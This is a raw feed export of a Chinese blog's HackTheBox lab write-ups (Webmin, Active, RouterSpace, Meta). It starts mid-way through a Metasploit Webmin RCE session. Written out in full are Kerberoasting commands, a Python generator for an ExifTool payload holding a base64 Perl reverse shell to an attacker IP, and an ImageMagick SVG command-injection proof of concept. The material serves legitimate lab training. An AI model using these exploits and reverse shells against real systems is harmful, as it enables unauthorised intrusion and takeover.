     The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> rhosts 10.10.10.160</span><br><span class="line">rhosts =&gt; 10.10.10.160</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> ssl <span class="literal">true</span></span><br><span class="line">[!] Changing the SSL option<span class="string">&#x27;s value may require changing RPORT!</span></span><br><span class="line"><span class="string">ssl =&gt; true</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/linux/http/webmin_packageup_rce):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   PASSWORD   computer2008     yes       Webmin Password</span></span><br><span class="line"><span class="string">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span></span><br><span class="line"><span class="string">   RPORT      10000            yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SSL        true             no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">   TARGETURI  /                yes       Base path for Webmin application</span></span><br><span class="line"><span class="string">   USERNAME                    yes       Webmin Username</span></span><br><span class="line"><span class="string">   VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (cmd/unix/reverse_perl):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   LHOST                   yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Webmin &lt;= 1.910</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Matt</span></span><br><span class="line"><span class="string">username =&gt; Matt</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost 10.10.14.9</span></span><br><span class="line"><span class="string">lhost =&gt; 10.10.14.9</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl true</span></span><br><span class="line"><span class="string">[!] Changing the SSL option&#x27;</span>s value may require changing RPORT!</span><br><span class="line">ssl =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Active</title>
    <url>/2022/03/20/Active/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/eda8a039099d4943bbdadeca0b30a10a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了135,445,88这些常见的端口<br><img src="https://img-blog.csdnimg.cn/5cf14b42521c4a969e73a389b2407517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>可以匿名登录smb服务<br><img src="https://img-blog.csdnimg.cn/e3d0be21298842868f97f94a04e6481e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们看到存在一个<code>Replication</code>的目录，我们尝试登录进这个目录看看。发现存在<code>active.htb</code>目录，并且该目录下有几个有价值的目录信息<br><img src="https://img-blog.csdnimg.cn/5539c4e4a9ad4b5da24575f1cae90b36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我经过细心查看后，只有在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下找到一个<code>Groups.xml</code>文件，经过查看这是一个组策略文件，用于帐户管理的组策略存储在域控制器上的“Groups.xml”文件中，该文件隐藏在 SYSVOL 文件夹中。<br><img src="https://img-blog.csdnimg.cn/3dfeaf7a43274b6db80c1986b56c764c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因为这个文件使用了特殊的算法进行加密的，所以我们可以使用<code>gpp-decrypt.py</code>这个脚本进行解密，解密出来的结果如下图所示<br><img src="https://img-blog.csdnimg.cn/3b1d134c71474bf78e60b56c7094f613.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>有了账户和密码后，我们登录SMB服务可以查看更多的共享<br><img src="https://img-blog.csdnimg.cn/a0cabca528234f819d7f3fac04fd95c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账户密码访问Users共享<br><img src="https://img-blog.csdnimg.cn/3d172d64bc1c426399eefb0f548f5fff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在桌面上找到第一个答案值<br><img src="https://img-blog.csdnimg.cn/9465fa15bea246989886ef686a471ddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们使用<code>rpcclient</code>枚举用户名和用户组<br><img src="https://img-blog.csdnimg.cn/fe3c3ce5801a4fca8ff2eae28e6cc801.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>GetUserSPNs.py</code>脚本获取与普通用户帐户关联的服务主体名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/18a215bbad5044eea14f81afb92ed4a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取到哈希值后，使用john来破解得到明文密码。<br><img src="https://img-blog.csdnimg.cn/fefaa6cda3e74dbf93337c78a2fededc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>现在我们有了管理员的凭据后，可以先看看管理员可以访问哪些共享。可以看到，我们可以访问C盘的共享<br><img src="https://img-blog.csdnimg.cn/ddc1a806b114476996349f7104571698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进入C盘目录<br><img src="https://img-blog.csdnimg.cn/44b03ce98746402491959058ebfaa443.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>并在桌面上查找到root.txt文件<br><img src="https://img-blog.csdnimg.cn/cdd2ab04ba094a5b9ec52a984a7b800f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>RouterSpace</title>
    <url>/2022/03/20/RouterSpace/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们发现目标主机开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/5048fe7b19bb4f599fb152f151933e22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们访问web页面时，并没有发现存在新的突破口，也没有发现存在域名。可是我们发现了一个apk文件可下载，初步猜测这是一个有关app的测试了<br><img src="https://img-blog.csdnimg.cn/6ed55fe40b034cc78f3bc0c8ce19c716.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>因为我这边已经尝试过使用linux安装anbox，感觉不太成功，所以我这边直接使用了夜神模拟器配合burpsuite进行抓包分析，这个是参考文章<a href="https://www.cnblogs.com/wjrblogs/p/13683812.html">https://www.cnblogs.com/wjrblogs/p/13683812.html</a><br><img src="https://img-blog.csdnimg.cn/d165e27c0e2b4d74b2377be88ae16afd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们在那里发现了一个域名<code>routerspace.htb</code>，我们使用管理员权限将其写进到hosts文件中(这里建议使用cmd命令行打开后，再使用notepad程序对其进行修改)<br><img src="https://img-blog.csdnimg.cn/bd2d89a09f124018beb3c009659fa3c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们尝试放一个包看看，返回的信息正常<br><img src="https://img-blog.csdnimg.cn/fb97d042c99a4c2cbd5d137662724125.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这种路由器式的，直觉告诉我可能存在RCE漏洞，我们尝试构造payload看看返回的结果。发现直接返回用户名称，那证明RCE漏洞是存在的。<br><img src="https://img-blog.csdnimg.cn/70f7be924704490baff42b1df46f08ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>既然我们可以执行命令，那么我们可以尝试构造POC进行漏洞利用。首先我们先尝试是否可以写入文件，发现并没有数据包返回，那证明这个不行<br><img src="https://img-blog.csdnimg.cn/529e423d54c14aca97c5a2da26972a9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们再试试能不能执行<code>/bin/bash</code>的命令，发现好像也不行<br><img src="https://img-blog.csdnimg.cn/40a5269c9148407dbd145fb7f943cdda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们试试<code>ls</code>命令，发现可以成功执行命令，并且返回内容<br><img src="https://img-blog.csdnimg.cn/45313dfdafa64ca5938a5aaf5ebe37f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试<code>.ssh</code>目录是否可以写入文件，答案是可以的<br><img src="https://img-blog.csdnimg.cn/2262039e5fa24afe9d495f629d560c91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们就有一个思路了，就是我们可以自己生成一个ssh的key，然后写入到这个目录上，那么我们就可以登录到这台主机上了。首先我们在kali上生成一个id_rsa.pub文件，然后发送到.ssh目录上，并赋予700权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDA4G+qgL/420+qY3ylhOQOGU9/0AqjC1aodWwl+Gb3KoQGzkqMTsZ6ju64LkT2nguCeMB1NIQrUPoifSlPC/HjKD277s076eGSfuBkjTWy2EL3V6I71kXkblmeyHNFo7Vbpmbkk+NTC3Yn2gwi8uGAX10GsEzliu+dG8ldKXMNzrz9Vk2KUKJPIEuMVHlG6lMCY5s6zO1CXG5MZLoFO2S2j5MOUAhV6h1ziC6zGBwXbs1m+hJvVzPfRUFTxmbsGtQAqueWMsBBHOhss4FgNNJe4pgeNQfdkwNlrq65V7g/gyQODG/mhsd81HimqyZY90vSipxysEV/aNd39RaBSSm3o4mOuoIRsZnU1DlBOdPMLOQaw6ERc2mwQFAyZTMa6vVDi/seoltYHUDaojfuTdIkqSN65a2IZAOhm9QpXXBqBHkWRrx/B3htrQA/Pxfy4Gnvpy3wqli/BvlrzI/a9m3FaZNGilSo36lB2hOeS+dzUcilkXJqkCvOJa5r94M4+RM= root@kali</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ff6804d51e9d4c69ad60f5bbba670bf6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/35e772f089064ac29dc72e9e7d9dac5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以在kali上登录成功<br><img src="https://img-blog.csdnimg.cn/7197de9bfd0642eea38a56b856055a36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到ROOT"><a href="#提权到ROOT" class="headerlink" title="提权到ROOT"></a>提权到ROOT</h2><p>首先我们先上传个linpeas.sh文件，看看有什么提权的点。我们从这里看到了sudo的版本是旧版的，而且提示说可能存在漏洞<br><img src="https://img-blog.csdnimg.cn/a36a9401dcbc4010bb23df3661956258.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f5c95d3627f04de3aef68e72d5a6bb85.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/21b844b3a03248268e09ed0b2359072d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在github上找到了对应的提权漏洞，编号为<code>CVE-2021-3156</code>。因为不能wget，所以我把里面的内容都一一复制了出来，这是github的地址<a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a><br><img src="https://img-blog.csdnimg.cn/b59453abc5bc417aa4ac9b04aaa6f3b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>App渗透</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Meta</title>
    <url>/2022/02/28/Meta/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机只开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/e44de3ff9ec249158e313f30d95c73ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们访问web主页时，发现只是一个很普通的apache搭建的页面<br><img src="https://img-blog.csdnimg.cn/5faebd3ecae84cfcb3b00eacdf9fdfc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>目录扫描貌似好像也没发现什么有价值的信息<br><img src="https://img-blog.csdnimg.cn/1e7e687ac113488b8fb14fa19ed5a61d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>什么发现也没有，当我们扫描子域名时，发现了一个子域<br><img src="https://img-blog.csdnimg.cn/1314b6048efc42bca44cf2435e76decf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们访问这个子域时，发现是一个文件上传的点。经过反复测试，初步断定它对上传内容进行了仔细的检查，任何不符合图片特征的文件都会被过滤掉<br><img src="https://img-blog.csdnimg.cn/22c1b5eabb3e4ce09a79adbcb78671b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们尝试上传一张正常的图片试试，这个格式是否很眼熟？对的，这是exiftool工具的输出格式<br><img src="https://img-blog.csdnimg.cn/2eeabd15c6a041ff8ac20e97e9fac527.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/63c038ce761e41d3b3cc235f3354e1b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>说实话这里是我自己本人没想到，可能是我自己的经验不太够吧。这里我们要找的是exiftool对应的漏洞，对的没想到吧，我也是参考了别人的意见才知道的。这里已经披露出了对应的漏洞编号了<br><img src="https://img-blog.csdnimg.cn/79945371d22b48d38a108e4b60f39dbb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我选择了第二个网址上的漏洞利用脚本，因为上面那个依赖问题太复杂了。首先我们先生成一个图片马文件，将脚本文件的IP和监听端口改成我们对应的IP和端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;10.10.14.60&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;4444&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;(metadata \&quot;\c$&#123;use MIME::Base64;eval(decode_base64(&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload + base64.b64encode( <span class="string">f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(<span class="subst">&#123;port&#125;</span>,inet_aton(&#x27;<span class="subst">&#123;ip&#125;</span>&#x27;))))&#123;&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;&#125;;&quot;</span>.encode() )</span><br><span class="line"></span><br><span class="line">payload = payload + <span class="string">b&quot;&#x27;))&#125;;\&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_file = <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">payload_file.write(payload.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">payload_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&#x27;bzz&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>, <span class="string">&#x27;payload.bzz&#x27;</span>])</span><br><span class="line">subprocess.run([<span class="string">&#x27;djvumake&#x27;</span>, <span class="string">&#x27;exploit.djvu&#x27;</span>, <span class="string">&quot;INFO=1,1&quot;</span>, <span class="string">&#x27;BGjp=/dev/null&#x27;</span>, <span class="string">&#x27;ANTz=payload.bzz&#x27;</span>])</span><br><span class="line">subprocess.run([<span class="string">&#x27;exiftool&#x27;</span>, <span class="string">&#x27;-config&#x27;</span>, <span class="string">&#x27;configfile&#x27;</span>, <span class="string">&#x27;-HasselbladExif&lt;=exploit.djvu&#x27;</span>, <span class="string">&#x27;image.jpg&#x27;</span>]) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fac6e927ad1940cc90f1a379e3b299c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传image.jpg木马图片后，我们得到了www-data用户的权限<br><img src="https://img-blog.csdnimg.cn/9380c7ea757846259f3151ada423caf7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是当我们进入thomas用户的<code>.ssh</code>目录时，发现没有权限，并且user.txt文件也没有权限查看<br><img src="https://img-blog.csdnimg.cn/7888820403bb4a8382561e6bd9c30d71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看主机的内核版本，发现是64位的Linux主机<br><img src="https://img-blog.csdnimg.cn/cb52633575a546c2817023ca0d7b04b1.png" alt="在这里插入图片描述"><br>我们可以尝试上传pspy64这个脚本进行探测，pspy 是一个命令行工具，旨在侦听进程而无需 root 权限。它允许您在执行时查看其他用户、cron 作业等运行的命令。发现了一个<code>convert_images.sh</code>脚本<br><img src="https://img-blog.csdnimg.cn/062aec9a84b14b5190b0501765926e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下这个脚本的内容，发现它是先进入到对应的目录中，然后再运行mogrify这个程序将发现的文件转换为png文件，最后杀死这个进程。<br><img src="https://img-blog.csdnimg.cn/ac6aaed6b8334939a293bfd860e98975.png" alt="在这里插入图片描述"><br>我们可以查看一下mogrify这个程序的版本，发现是<code>7.0.10-36</code><br><img src="https://img-blog.csdnimg.cn/073f7d8415794159b62d0729a8c746f0.png" alt="在这里插入图片描述"><br>在网上搜索到对应的漏洞编号是<code>CVE-2016-3714</code><br><img src="https://img-blog.csdnimg.cn/3b8c9945b1b34bdcb9bf0ab65d8dc735.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>利用的方法是上传一个poc.svg文件到<code>/dev/shm</code>目录下，并将poc.svg文件复制到<code>/var/www/dev01.artcorp.htb/convert_images/</code>这个目录下，经过一段时间后会生成一个0wned文件，输出了用户名证明文件成功执行了包含的命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">authenticate</span>=<span class="string">&#x27;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">get</span> <span class="attr">width</span>=<span class="string">&quot;base-width&quot;</span> <span class="attr">height</span>=<span class="string">&quot;base-height&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resize</span> <span class="attr">geometry</span>=<span class="string">&quot;400x400&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;test.png&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;700&quot;</span> <span class="attr">height</span>=<span class="string">&quot;700&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       </span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;msl:poc.svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
